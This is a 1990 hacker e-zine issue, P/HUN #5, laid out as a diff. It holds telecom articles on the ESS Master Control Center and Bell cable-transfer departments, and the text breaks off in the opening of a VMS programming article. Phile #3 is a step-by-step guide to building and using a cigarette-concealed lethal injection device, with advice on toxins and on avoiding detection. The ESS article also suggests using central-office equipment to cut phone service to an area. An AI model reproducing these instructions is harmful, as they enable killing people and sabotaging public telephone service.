@@ -1,0 +1,3278 @@
+()---------------------------------------------------------------------------()
+  P/HUN Issue #5                                            Articles [14]
+  Released 5/07/90                                          Comments: PHUN #5
+                            
+       
+                          P/HUN MAGAZINE Issue #5
+                          -----------------------
+                      P/HUN Magazine Inc., Productions
+                      --------------------------------
+                    Phile #1 of P/HUN Magazine Issue  #5
+                    ------------------------------------
+
+
+Hello and welcome to Issue #5. As you may have noticed our BBS went down a 
+couple of months ago. Since we no longer have a BBS, P/HUN Issues can 
+regularly be found on these boards:    
+
+                       =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+                       The Uncensored BBS - (914)761/6877
+                    Demon Roach Underground - (806)794/4362
+    CLLI Code BBS - [leave mail at clli@m-net.ann-arbor.mi.us for access]
+    =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+                           >>>ANNOUNCEMENT<<<
+
+The CLLI Code BBS (above) is highly recommended by us. It deals with all 
+aspects of telecommunications and computer security. We suggest our readership
+contact them for access.
+  
+                           >>>ANNOUNCEMENT<<<
+
+The first issue of Cybertek Magazine(hardcopy) was just published some weeks 
+ago. We reviewed it, and thought it was fantastic. We rate it as a magazine
+with exceptional qualities and obviously with high potentials. The new magazine
+covers various aspects of telephony, radio, chemistry, security and survival. 
+We would like to point out that this is not solely a 'hacking magazine' however
+various aspects are covered.
+
+Cost $1.80 per Issue // Subcriptions are $10 per year
+
+Send to:
+--------
+Cybertek Magazine 
+P.O BOX 64
+Brewster, NY 10509
+
+Mr. Icom (editor) can be contacted at the bulletin boards listed above.
+
+           o--------------------------------------------------o
+
+We would like to thank the members of SSWC (The Technician, Cellular Phanton 
+and Chance ) for contributing their first class research reports to this issue.
+Their reports are truly educational and innovative as you will see.        
+
+A special thanks goes to Bandito, Baliord, Jack the Ripper, Lord Micro, Seeker
+and The Ring Master.
+
+If you wish to contribute articles to P/HUN you can contact us at the boards 
+listed above or on our Usenet address.
+
+Enjoy!
+
+                                            Red Knight           
+                                         P/HUN Magazine Inc.
+                                Usenet Address: phunmag@dasys1.UUCP
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+#   Phile Description                                 Size  Author or Group
+-   ------------------------------------------------  ----  ---------------   
+1   Introduction                                      1k    Red Knight
+2   Peering the soul of ESS - Master Control Center   11k   Jack the Ripper
+3   Born to Kill - The Art of Assasination            5k    Jack the Ripper
+4   SSWC Bell Research Report Volume #1               7k    SSWC
+5   SSWC Bell Research Report Volume #2               12k   SSWC 
+6   Baliord VMS Tricks Volume I: PHONE                15k   Baliord
+7   Baliord VMS Tricks Volume II: DOOR                12k   Baliord
+8   (O)perator (S)ervices (P)osition (S)ystem - 5ESS  23k   Bandito   
+9   The Crossbar Switching Guide [Xbar No. 5] Part I  8k    Xbar Switchman
+10  SSWC Bell Research Report Volume #3               10k   SSWC 
+11  Carrier 900/700 Services                          5k    Tone Tec
+12  Legion of Doom Indictments [Chicago Members]      18k   TELECOM Digest
+13  Card Reader Access System (Card Key)              2k    The Ring Master
+14  S.S.T.C - LMOS GUIDELINES                         3k    The Trasher 005
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+ ____________________________________________________________________________
+|                                                                            |
+|         "Peering into the Soul of ESS - The Master Control Center"         |
+|                                                                            |
+|                        Written By - Jack The Ripper                        |
+|                                                                            |
+|                            Organized Crime (OC)                            |
+|                     Phile #2 of P/HUN Magazine Issue #5                    |
+|____________________________________________________________________________|
+
+
+
+        The Master Control Center is undoubtably the very essence of ESS.  The
+Master Control Center (MCC) is the operational, maintenance, and administrative
+core of the electronic switching central office.  This unit is what the ESS
+operators use to control the ESS switch.  It test's customer lines and trunks,
+alarms to indicate malfunctions, perfroms system testing functions, controls
+operations, contains the magnetic tapes for recording Automatic Message
+Accounting (AMA) data, and contains various other specialized equipment.
+
+
+Primary Components of the MCC
+-----------------------------
+
+Master Control Console
+Trunk and Line Test Facilities
+Teletype (Teletypewriter) Channels 
+AMA Recorders
+DATASPEED -40 Terminal with Display and Printer
+
+
+
+[---------------------------------------------------------------------------]
+[ Diagram of Processor Display Panel of Master Control Console in No.1A ESS ]
+[---------------------------------------------------------------------------]
+_______________________________________________________________________________
+| Processor Display       |   PS Bus   |   Pu Bus   |   CS Bus   |   AU Bus   |
+|                         | Ad Re Ad Re| Ad Re Ad Re| Ad Re Ad Re| Ad Re Ad Re|
+-------------------------------------------------------------------------------
+|_____________________________________________________________________________|
+||CC0 | ac| tr| po| st| of|| 0| 0| 1| 1|| 0| 0| 1| 1|| 0| 0| 1| 1|| 0| 0| 1| 1|
+||----------------------------------------------------------------------------|
+|| ltllh |====================================================================|
+||-------|--------------------------------------------------------------------|
+|| ltllh |====================================================================|
+||____________________________________________________________________________|
+||CC1 | ac| tr| po| st| of|| 0| 0| 1| 1|| 0| 0| 1| 1|| 0| 0| 1| 1|| 0| 0| 1| 1|
+||----------------------------------------------------------------------------|
+||                        ||           ||           ||           ||           |
+||         --------------------------------------------------------           |
+||         |meno|kc     ||           ||meno|kc     ||           ||            |
+||         |------------||___________||------------||___________||------------|
+||         |02| |36|ntce|| 0! 0! 1| 1||02| |05|ntce|| 0| 0| 1| 1||fs|df|ft|df2|
+||         -------------------------------------------------------------------|
+||         |            ||           ||            ||                         |
+||         |   seno     ||           ||   seno     ||                         |
+||         |   ---- ----||           ||   ---- ----||                         |
+||         |ps|0|2| |ii ||           ||ps|0|2| |lh ||                         |
+||         |  ----- ----||           ||  ----- ----||                         |
+||----------------------------------------------------------------------------|
+|| Update  || OverRide Control || SysR      || Processor Configuration Seq.   |
+||         ||                  ||           ||         state counter          |
+||   ----- ||------------ -----||-----------||---------------  -----          |
+||   |inp| ||bl|au|ps|cc| | no ||rea|ena|err||p3|p1|8|4|2|1||  |rec|          |
+||   ----- ||------------ -----||-----------||---------------  -----          |
+||   ----- ||------------      ||           ||                                |
+||   |fs0| ||vr|a1|p2|c1|      ||___________||                                |
+||   ----- ||------------      ||           ||                                |
+||   ----- ||          Activate||           ||Activate                        |
+||   |fs1| || ----      ----   ||   -----   ||------        ------------------|
+||   ----- || |x1|      |x2|   ||   |inv|   ||q1|q2|        |w1|w2|w3|w4|w5|w6|
+||         || ----      ----   ||   -----   ||------        ------------------|
+||         ||                  ||           ||                                |
+||_________||__________________||___________||________________________________|
+
+Key
+---
+w6   = Prssr Comfg
+w5   = Prgm Store
+w4   = Call Store
+w3   = Basic Prssr
+w2   = Reptd Pc
+w1   = Pc Atmpt
+x2   = Ovrd Efct
+x1   = Vrbl PS1 
+q2   = Dsble Auto
+q1   = PC
+fs1  = FS 163
+c1   = CC1
+p2   = PS Bus 1
+a1   = AU Bus 1
+vr   = Vrbl PS 0
+fs0  = FS 062
+rec  = Reset Cntr
+p1   = Pmp 16
+p3   = Pmp 32
+err  = Error
+ena  = Enable Data
+rea  = ready 
+no   = No Ovrd
+cc   = CC D
+ps   = PS Bus 0 
+au   = Au Bus  0
+bl   = Blk 0 Ps 0  
+inp  = In Prgs
+SysR = System Reinitialization
+lh   = LHIJI
+ii   = IIOLI
+seno = Select No. (Select Number)
+df2  = Disk File 1
+ft   = FS 1 Trbl 
+df   = Disk File 0
+fs   = FS 0 Trbl
+meno = Member Number
+kc   = K-Code
+||   = Separates different Status Bars ie PS Bus, Processor Display, and Au Bus
+ac   = Active 
+tr   = Trble
+po   = Power
+st   = Stop
+of   = Offline
+
++++ Added note on the key is that the abbreviations on the key are exactly the
+same as they appear on the panel.
+
+
+        As you can see the MCC panel is divided up into five main groups of
+keys and lighted or LED displays;  processor display, update, override control,
+system reinitialization, and processor configuration sequencer.  The update
+group of keys and displays permits personnel to check when a program update is
+in progress.  The override group of switchs and displays allows personnel to
+manually activate a central control unit, auxillary bus unit, and program store
+buse for emergency system recovery.  The system reinitialization keys and
+displays allow personnel to manually reinitialize the system in conjuction with
+the override control or processor configuration sequencer group of keys.  
+
+Workings of the MCC and Points of Interest
+------------------------------------------
+        
+        Now that you have a little background information on the MCC, and are
+familiar with the MCC Console we can talk about the MCC a little more.  The MCC
+can be used to remove from service all outgoing trunks, customer lines, and
+service circuits.  This would be an interesting project next time your at your
+local CO to stop all service to an area.  The MCC is capable of flagging
+pernament signals i.e. busy signal (black box on electromechanical or crossbar
+offices) .  The master testing circuit can be connected to any outgoing trunk,
+service circuit, and most often any customers lines for testing purposes.  Also
+the MCC can be connected to any voltmeter to test any customers line, service
+circuit, or outgoing trunk.  The MCC also interacts with Remote Switching
+Systems to perform various testing functions to detect bad circuits and
+potential future problems i.e. a decaying circuit or two.  
+
+AMA in the MCC
+--------------
+
+        The Automatic Message Accounting recorder is located on the MCC and
+stores "customer billing information <right>" on magnetic tapes.  One 2,400 ft
+reel of tape stores the billing data for 100,000 calls a day.  These tapes
+however are backed up by duplicates to ensure against failure or billing error
+although it does happen, and the two copies are sent to a DPC (Data Processing
+Center) for analysis in computing customer bills   The data that is to be
+stored is selected by the call processing program, which deceides whether or
+not the information for a call is to be stored.  Then the data is temporarily
+stored in the AMA register (full capacity of the AMA register is 230 bits each)
+call store, and after completion of the call the related data is assembled in
+the BCD (Binary Coded Decimal (see Binary Number System for Decimal Digits
+Diagram)) format and placed in the AMA buffer call store.
+
+Binary Number System for Decimal Digits
+---------------------------------------
+
+Decimal    Four Digit Binary Code
+Number       A     B     C     D
+            <8>   <4>   <2>   <1>
+-----------------------------------------
+  0          0     0     0     0
+  1          0     0     0     1
+  2          0     0     1     0
+  3          0     0     1     1
+  4          0     1     0     0 
+  5          0     1     0     0 
+  6          0     1     1     0
+  7          0     1     1     1
+  8          1     0     0     0
+  9          1     0     0     1
+  10         1     0     1     0 
+  11         1     0     1     1 
+  12         1     1     0     0 
+  13         1     1     0     1 
+  14         1     1     1     0
+  15         1     1     1     1
+
+        The recording procedure is then started by an AMA program in program
+store when the AMA buffer in call store is fully loaded.  The AMA buffer has a
+full capacity of 140 words of 23 bits each.  The AMA program will cause central
+control to direct that the data be transferred one word at a time to the AMA
+circuit for recording on the tape.
+
+Suggested Reading
+-----------------
+
+Basic Carrier Telephony, Third Edition by David Talley
+Basic Telephone Switching Systems, Second Edition by David Talley
+
+Anything Else by David Talley he wrote a few more.  He is one of the best
+telecommunications authors, and all of this information was born into me
+through him.  His books are also written with quesitons in the back which helps
+you to learn the information.  Next time some moron throws an infoform at you
+asking what ESS is you can quite simply say something rude like, "Are you
+talking about the program interruptions in a No.1A ESS office which occur every
+1.4 microseconds due to the system clock providing of course that it is running
+off of a 1A processor and hasn't been modified in any way, and is running stock
+software?"  That outta get em eh?
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+ _____________________________________________________________________________
+|                                                                            |
+|                 Born to Kill - The Art of Assassination                    |
+|                                                                            |
+|                                 Part I                                     |
+|                                                                            |
+|                     Written by - Jack The Ripper (OC)                      |
+|                                                                            |
+|                     London at Midnight-  713-523-3733                      |
+|                    Phile #3 of P/HUN Magazine Issue #5 	             |
+|____________________________________________________________________________|
+
+
+
+        This is a series solely written from pure genius.  You will not find
+the methods outlined here in any book or any other publication.  They are for
+informational purposes only, and are not to be used.  The method I will outline
+here will consist of two parts.  The first part is the construction of a lethal
+injection device.  The second part will discuss how to turn this device into a
+totally harmless looking device that kills quickly, silently, and effectively.
+
+Construction of a Lethal Injection Device 
+------------------------------------------
+
+Materials Needed
+----------------
+
+Deadly Toxin i.e. air, cyanide, etc... (no specifics are outlined)
+Larger syringe if superimpostition is needed.
+5 cc or less size syringe with a 3/4 inch needle if unavailable superimpose.
+a syringe that's body fits loosely in an emptied cigarette.
+Superglue if superimposition is needed.
+Cigarette Pack 100's preferably
+
+Preparing the Syringe
+---------------------
+
+1) Totally disassemble the syring you will be working with the two parts.
+    mainly
+
+2) Skip if needle is 3/4's of an inch.  Break the needle off of the larger 
+   syringe.  Now place glue around the base of the smaller syringes needle not
+   much just a dab or two.  Place the larger needle over the smaller needle 
+   so that it extends it out to the full 3/4's of an inch.  
+
+3) cut the length of the syringe (the body only! not including the needle)
+   down to 1 and 1/2 of an inch with a hacksaw so as to make a clean cut.
+
+4) Now take the push stick or the handle of the syringe and cut off the tip
+   of it, and cut the body down so that it is 1 and 1/2 inch's long.
+
+5) What you should have now is a push stick that is 1 and 1/2 inchs long and
+   fits just inside the syringe which is 1 and 1/2 inchs long, and a needle
+   that is 3/4's of an inch long.  The whole contraption should be 3 and 
+   3/4's of an inch enough to fit in a 100 cigarette easily.
+
+Preparing the cigarette
+-----------------------
+
+1) Remove the filter from the cigarette by twisting it off, and then throw the
+   long part of the cigarette away.  The paper should extend about 1/4 of an 
+   inch from the filter, and try not to rip it.  The paper normally extends 
+   a little bit naturally.
+
+2) Take your tweesers and pick out the filter from the inside of the cigarette
+   leaving a little bit about 1/4 inch of the filter to cover the end of the 
+   cigarette.
+
+3) Now take another cigarette and tear off the long part, and empty out the 
+   tobacco saving it for later. 
+
+4) Now you should have an empty hollow cigarette shell.  A bored out filter
+   with 1/4 of an inch of the ending left on.
+
+5) Now glue the long hollow part of the cigarette back to the filter and let
+   it dry.
+
+Arming the Contraption
+----------------------
+
+1) Now place the toxin into the body of the syringe with the needle on it of
+   course.
+
+2) Place the pushstick over it extended.
+
+3) Place the setup into the cigarette with the back of the push stick touching
+   the filter.  
+
+4) Fill the remaining space of the cigarette with the leftover tobacco.
+
+How to Use
+----------
+
+1) Light the cigarette since the needle end will be filled with a good portion
+   roughly 1 minute 15 seconds of burning tobacco. 
+
+2) Walk by the victim and burn him/inject him by pushing down on the filter of
+   the armed cigarette.
+
+3) The victim will think it was just a cigarette burn call you an idiot and 
+   walk away.
+
+Notes
+-----
+
+1) You might have to experiment with the lengths to get it just right.
+
+2) Only use 1 cc or less of toxin or the victim might notice that something
+   funny is going on before he dies.
+
+3) Test it before you use it.  Cigarettes are a dime a dozen.
+
+4) Never throw it away near the site.
+
+5) Destroy it after it's use since plastic melts this is easy then throw it
+   in a gutter or a junkyard.
+
+6) Be careful not to scrape yourself.
+
+7) The burn will take care of the pain, so he/she shouldn't notice a thing.
+
+8) There will most likely be an inquest especially when normal people just drop
+   dead and die.
+
+9) Try to use slow acting 15-30 minute toxins that are lethal in small doses.
+
+Toxins for Use
+--------------
+
+1) The Simplest toxin to use is air.  An air bubble in the brain causes death  
+ and there is no way in hell a coroner can detect foul play unless he is   
+looking for it.  Not to mention there will be a burn blister over the 
+   injection hole, so it will not be noticed.
+
+2) Be creative think of something.
+
+Conclusion
+----------
+
+        In conclusion I would like to add that there are many toxins for you
+use.  There are hundreds of other viable options out there just waiting to be
+discovered.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+ 
+    =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                    
+    | SSWC - Bell Research Report (Vol I) |               
+    |------------------------------------ |
+    | Phile #4 of P/HUN Magazine Issue #5 |
+    =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+
+
+      All research gathered, tested and mastered by the original 
+      members of SSWC:  
+ 
+      Chance - The Technician - Cellular Phantom 
+ 
+       
+      This text will give you an in depth look at some unexplored 
+      operating departments located in the Bell System. As well 
+      as newly discovered equipment and electronic devices used 
+      by Bell Technicians. Note that information in this file is 
+      subject to change. However, we will try to keep you updated 
+      as much as possible. 
+ 
+      There are many different types of acronyms used in this text. 
+      You will find a list these acronyms at the end of this file. 
+ 
+ 
+ 
+   We will begin the file by discussing a mechanical/electronic 
+device used by the Cable Transfer Administration (CTA) known as 
+a Transfer Switch. This device is specifically used to verify a 
+working line on both the "from" cable pair and the "to" cable 
+pair through the backtap, and is transparent to the customer (in 
+other words the device is unnoticeable to the customer).      
+Although the Transfer Switch itself is located at the CO, CTA 
+is responsible for the maintenance and upkeep of the Transfer 
+Switch.  
+ 
+   Next we will discuss a department of Bell known as the 
+Distribution Service Design Center (DSDC). The Cable Transfer 
+Representative (this person is a clerk for DSDC), will prepare 
+the Cable Transfer Schedule and assist the other representatives 
+in coordinating telephone line repair and completion dates. 
+The engineering job schedule, service requirement dates, pending 
+or potential held orders, age of job, etc, will determine the 
+priority of each scheduled completion date. It is the  
+responsibility of DSDC Transfer Representatives and Committees 
+to provide a splicing sequence and resultant fill on an 
+Engineering Work Order (EWO). The DSDC will determine the number 
+of "Plain Old Telephone Service" (POTS) circuits and special 
+and designed services on the EWO. They will help determine if 
+the rearrangements and changes incorporated in the EWO will 
+necessitate a design review by the Circuit Provision Center (CPC). 
+The DSDC will forward to the CPC old and new line makeups for 
+designed service. The DSDC scheduling engineer is responsible 
+for reviewing old and new EWOs involving cable, line, or station 
+rearrangements and for establishing the time needed for job completion. After reviewing old work orders, the DSDC shall 
+do one of the following: 
+ 
+ 
+ 
+1. Reschedule the cable, line, or station transfers. 
+ 
+2. Initiate a revision of the transfer so it will be compatible 
+   with existing conditions. 
+ 
+3. Issue a cancellation of the particular transfer in question. 
+ 
+   The Circuit Provision Center (CPC) involves cable, line, or 
+station transfer procedures when it is presented a notification 
+of a cable transfer and an indication that special services are 
+involved. The CPC will receive notification from the DSDC that  
+a circuit change will be required. The notification document  
+will provide the CPC with: 
+ 
+A. Project number and expected record issue date (RID) and  
+   due date 
+ 
+B. Common language circuit identification (CLCI) 
+ 
+C. Old assignment and makeup  
+ 
+D. New assignment and makeup.  
+ 
+   It is the responsibility for The Frame Control Center (FCC) 
+and affiliated representatives to contact each CO involved in a 
+cable transfer and will be a member of the Cable Transfer 
+Committee (CTC), and will attend committee meetings. The CTC 
+will also make frame cross-connect activity completion 
+commitments. Placing and removing front-tap connectors, sending 
+tone, and connecting automatic taggers and Central Work Group  
+(CWG) talk pairs shall be the responsibility of the FCC. 
+ 
+   Upon receiving of either the Exchange Customer Cable Record 
+(ECCR), Computer Systems for Mainframe Operations (COSMOS) 
+printouts, or local forms from the Loop Assignment Center (LAC), 
+the Central Office Work Group (COWG) shall make a verification 
+and test of the transferring cable counts and resolve all 
+record problems with the LAC. The COWG will use the following 
+procedures for verification and test: 
+ 
+1. Verify the telephone number on all working pairs in both 
+   the "from" and "to" counts and check for any vacant pairs not 
+   listed. 
+ 
+2. Test all vacant pairs in the "to" count, using the Go/No-Go  
+   test set or equivalent. 
+ 
+3. Any discrepancy found as determined in (1) or (2) shall be 
+   posted and the forms returned to the LAC on or before the  
+   scheduled completion date for verification and pretest as 
+   shown on the transfer schedule. 
+ 
+ 
+ 
+   Note: Verification and pretests are extremely important in 
+         preventing future service interruptions, unresolved 
+         discrepancies, and cost delays. (In other words this 
+         is done so Bell won't loose a dime of their precious 
+         "millions". 
+ 
+   After placing the backtaps, the COWG must validate that the 
+backtaps are correct and any work or record problems found, will 
+be corrected by the COWG and forwarded to the LAC for updating 
+records. In work locations where COSMOS is fully used, the  
+transfer MUST be stated in COSMOS, when backtaps are placed or 
+removed, by using the appropriate work code found in the COSMOS 
+Frame Training Manual. 
+ 
+ 
+ 
+ 
+   
+      *   Note to the reader: All Bell departments discussed in 
+            in this text work together on a regular basis, 
+            generally when their is a problem with a cable  
+            transfer or with similar related equipment, the 
+            Bell departments will interact with each other in 
+            order to remedy the problem. 
+ 
+          This concludes SSWCs Bell Research Report (Vol I). 
+          The information contained in this file is solely 
+          for the use of those that FULLY understand 
+          what has been discussed. If you do not FULLY  
+          understand what has been discussed in this file, 
+          it is extremely advisable not to attempt to use any 
+          of this information, whereas you could cause an 
+          extreme negative impact on your knowledge as a Phone 
+          Hack/Phreak. Have a good time, learn what you can, but 
+          never think you know more than you do. To the 
+          novice this file is all technical BullShit.  
+          However to the Innovative its much, much more. 
+ 
+ 
+ 
+GLOSSARY OF ACRONYMS: 
+ 
+         CLCI   - Common Language Circuit Identification 
+ 
+         COSMOS - Computer System for Mainframe Operations 
+ 
+         COWG   - Central Office Work Group  
+  
+         CPC    - Circuit Provision Center 
+ 
+         CMC    - Construction Management Center  
+ 
+ 
+ 
+         CTA    - Cable Transfer Administration  
+ 
+         DSDC   - Distribution Service Design Center 
+ 
+         ECCR   - Exchange Customer Cable Record 
+ 
+         EWO    - Engineering Work Order 
+ 
+         FCC    - Frame Control Center 
+ 
+         LAC    - Loop Assignment Center 
+ 
+         POTS   - Plain Old Telephone Service 
+ 
+         RID    - Record Issue Date 
+ 
+         SSC    - Special Service Center 
+ 
+          
+ 
+ 
+   *** SSWC: Were just getting started... 
+ 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+=================================================
+=      SSWC - Bell Research Report (Vol II)     =
+=      ------------------------------------     =
+=      Phile #5 of P/HUN Magazine Issue #5      =
+=================================================
+
+       All research gathered, tested and mastered by the original 
+       members of SSWC: 
+ 
+       Chance - The Technician - Cellular Phantom 
+ 
+ 
+       SSWC presents our latest text file continuing our discussion 
+       on Bell Operating Departments. Note that information in  
+       this file is subject to change. However, we will try to keep 
+       you updated as much as possible.  
+ 
+ 
+     We will begin by discussing an important department of Bell,  
+  known as the Maintenance Center (MC) or Special Service Center 
+  (SSC). The MC is responsible for verifying and coordinating the 
+  transfer of special service activities between the Construction 
+  Work Group (CWG) and the Central Office Work Group (COWG). The  
+  MC or SSC will maintain control of all special service transfers. 
+ 
+       Note: When using an approved transfer switch, testing of 
+             Plain Old Telephone Service (POTS) services  will be 
+             performed by the CWG. The MC meed only test services 
+             classified as type "B". (This type of classification 
+             is generally used on the Computer System for Mainframe 
+             Operation (COSMOS) mainframe). 
+ 
+    The MC will receive a copy of the cable transfer and associated 
+  work orders from the Loop Assignment Center (LAC) prior to the 
+  scheduled start date of the transfer. They will deal with any  
+  unrecognized problems (such as clearing defective pairs, if  
+  requested by the Distribution Service Design Center (DSDC), and 
+  giving notification of what pairs have been or cannot be cleared) 
+  that would require new pair count assignments.    
+      
+     The MC shall arrange with the CWG, Frame Control Center (FCC), 
+  SSC, and other necessary departments for the transfer of special 
+  and designed services that require release or special handling. 
+  During the transfer of these services, the MC will maintain  
+  communication with all personnel involved in the transfer  
+  activity. 
+    
+     The MC or SSC shall coordinate the release and transfer of 
+  special and designed services designated as "B" services. The time 
+  and date for each service release shall be recorded on the MC copy 
+  of the Special Service Protection List and Defective Pair List. 
+ 
+       Note: Time and date of release must be negotiated in advance 
+             of the cable transfer. No work shall be permitted on 
+             service requiring a release until a method of procedure, 
+             including release date and time and personnel required, 
+             has been established by the MC and approved by the  
+ 
+             customer and SSC control office responsible for those 
+             services. When the MC receives work of those specific 
+             or out-of-the-ordinary release requirements, the  
+             Construction Management Center (CMC) supervisor, FCC 
+             supervisor, and other necessary work group supervisors 
+             must be notified in advance so they can begin work on 
+             the transfer.  
+      
+     The MC shall test all affected special and designed services 
+  completed by the CWG as the transfer progresses. The CWG need not 
+  wait for verification by the MC, unless problems are encountered. 
+  The CWG will inform the MC of progress. The MC shall have the 
+  authority to stop the transfer procedures at any time if extensive 
+  trouble reports develope. If this occurs, the MC supervisor will 
+  lead an investigating committee to determine the cause of trouble 
+  and to recommend corrective action.  
+ 
+     After all work is completed, the MC will issue a final closing 
+  number for the completed transfer. The MC will notify the FCC that 
+  the transfer is complete and will give them the closing number. 
+  The MC will post the Cable Transfer Form as complete and will  
+  forward the transfer, including changes, and Defective Pair List 
+  to the LAC.   
+ 
+ 
+     We will now discuss the uses of the Cable Transfer Administration 
+  (CTA), and how they operate at a successful level.  
+ 
+     The general functions and responsibilities of the CTA work group 
+  is to provide flexibility in the design of the cable network,  
+  existing cable pairs are transferred for one cable count to another 
+  cable count. This is commonly referred to as a cable transfer or  
+  cable throw. The transfer occurs in a splice and involves  
+  disconnecting pairs of wires beyond the splice from one feeder 
+  cable count and reconnecting then to a different feeder count. 
+  The result is that the count of the pairs beyond the splice will 
+  change. The configuration, identification, and possible transferring 
+  of working cable pairs are complex and time-consuming. The work 
+  is further complicated by the many functions required of other  
+  work groups. To ensure that these operations are performed free of 
+  service interruptions and with maximum efficiency, timing and close 
+  coordination among all the work groups involved are mandatory. 
+ 
+     The same coordination is required to complete drop wire re- 
+  connections (line transfers). The Cable Transfer Committee (CTC) 
+  is also responsible for organizing this work in a timely manner. 
+  As soon as practical, after the line transfer have been completed, 
+  the old cable should be cut off and removed. (Their is more 
+  hardware work involved in this process, however we regret that 
+  we have not yet been able to fully research and understand what 
+  further hardware applications are used).  
+ 
+ 
+ 
+    
+      In order for the Cable Transfer Committee to obtain a high  
+  degree of transfer efficiency, all committee members must attend 
+  committee meetings on a selective basis and monitor the published 
+  minutes (in other words review information from past meetings). 
+  Higher management will be able to evaluate the effectiveness of  
+  the transfer committee. The number of jobs completed as scheduled 
+  and the ability of the committee to identify problems should be  
+  monitored as a measure of committee success in scheduling and 
+  completing cable transfers. 
+   
+     The use of these procedures will reduce customer trouble reports 
+  and the overall cost of cable and line transfers and will permit 
+  balancing the work force and work load for all groups involved. 
+  By completing cable transfers promptly, in accordance with the 
+  time schedule, changes to transfer sheets will be minimized, the 
+  need for rerunning cables will be reduced, testing cables can be 
+  properly scheduled, and time spent on field work can be shortened. 
+  The errors, frustrations, and probability of cable troubles  
+  associated with delays in this kind of work can be virtually  
+  eliminated. 
+      
+     A Cable Transfer Committee must be established in each network 
+  distribution service/construction district to ensure close  
+  coordination and proper timing of cable, line, or station transfers. 
+  Districts that cover a large service area (having more that one 
+  Loop Assignment Center or Maintenance Center) may require more 
+  than one committee. 
+ 
+ 
+     When scheduling transfers, consideration must be given to work 
+  tours and peak load periods (busy times of the week) of all work 
+  groups to optimize the continuity of the cable transfer activity. 
+  Consideration must also be given to time required by the CWG 
+  to complete preliminary work, by the LAC to analyze and lay out 
+  the transfer, by the Circuit Provision Center (CPC) to check the 
+  design of special services, by DSDC, Construction Management 
+  Center (CMC), and installation to make the resulting changes, and 
+  by the MC and/or SSC to negotiate with special service customers. 
+  The Cable Transfer Committee must negotiate all completion dates. 
+  The transfer committee chairperson will monitor and take action 
+  on excessive time intervals for all work groups. Transfers that 
+  involve an extremely large number of working circuits may require 
+  scheduling in smaller segments. Transfers should be scheduled to 
+  maintain continuity until wire work is completed. The committee 
+  is responsible for all special scheduling. Offices with  
+  mechanized assignment records such as COSMOS or TIRKS require 
+  more strict scheduling due to transaction restrictions. 
+  Sequence transfers and the reusing of counts cleared on previous 
+  transfers may also require more strict scheduling. Cable  
+  transfers worked via COSMOS must be closely monitored to avoid 
+  long-term storage of cable transfers in the data base. 
+  Long-term storage causes changes for the FCC and CWG, thereby 
+   
+  causing lost time. The committee will make preliminary arrange- 
+  ments for the transfer of special and designed services. The LAC 
+  will provide a list of all special services, by Common Language 
+  Circuit Identification (CLCI), that are in the affected cable  
+  count to the DSDC prior to scheduling the transfer in the firm 
+  period. The DSDC will forward the list to the CPC along with the 
+  new and old cable makeup for the reissuance of new Work Order 
+  Record Detail (WORD - The work authorization and layout card 
+  for designed special services) documents and redesigns, if 
+  necessary. 
+ 
+     After the new WORD documents are received, the FCC will bring 
+  the Work Authorization (WA - The first page of the WORD document) 
+  to the CTA committee meetings. The WA copy will contain the work 
+  description and associated notes for the transfer and, most 
+  important, will give the circuit classification code "A" or "B". 
+   
+ 
+ 
+     Next we will discuss information concerning the Telephone  
+  Outside Plant. This brief discussion will inform you exactly what 
+  path cables take from the CO to the subscribers residence.  
+  This path is as follows: 
+ 
+ 
+      1  Main Distributing Frame (MDF) 
+      2  Tip Cables 
+      3  Cable Vault 
+      4  CO Manhole 
+      5  Main Conduit  
+      6  Subsidiary Conduit  
+      7  Insulated Joint 
+      8  Main Distributing Terminal (MDT) 
+      9  Riser Cable 
+     10  Distributing Terminal  
+     11  Anchor Guy 
+     12  Aerial Cable Cross Connecting Box 
+     13  Telephone Company Owned Pole 
+     14  Aerial Cable 
+     15  Strand (one cable) 
+     16  Joint Use Pole Electric or Telephone 
+     17  Terminal  
+     18  Splice 
+     19  Electric Wires 
+     20  Urban Wires 
+     21  Dropwire 
+     22  Main U.G. Cable 
+     23  Stub 
+     24  Rear Wall Cable 
+     25  Buried Cable 
+     26  Cribbing  
+     27  Block Pole 
+ 
+ 
+     After completing this sequence the cables will then run into 
+  the residence, providing telephone service.  
+ 
+ 
+ 
+ 
+     *     Note to the reader: In order to gain maximum knowledge  
+             from this file, it is suggested that you obtain and 
+             study our first file.  
+            
+           This concludes SSWCs Bell Research Report (Vol II). 
+           The information contained in this file is solely for the 
+           use of those that FULLY understand what has been 
+           discussed. If you do not FULLY understand what has been 
+           discussed in this file, it is extremely advisable not to 
+           attempt to use any of this information, whereas you  
+           could cause an extreme negative impact on the rest of the 
+           the Hack/Phreak community. Have a good time, learn what you can, 
+           but never think you know more than you do. To the 
+           novice this file is all technical BullShit. However, to 
+           the Innovative, its much, much more. 
+ 
+ 
+   *  SSWC: The leader in innovative phreaking! 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+            
+
+                 Baliord's Stupid VMS Tricks Vol 1: PHONE
+                 ----------------------------------------  
+                               By Baliord
+
+                  Phile #6 of P/HUN Magazine Issue #5
+
+ 
+    This program is the culmination of about a month's research, debugging,
+and coding.  Any bugs in it are my fault, but I am not liable for them since
+I am not running it (or compiling it) on your system.  You accept all
+responsibility for the execution of this program by compiling it.  This
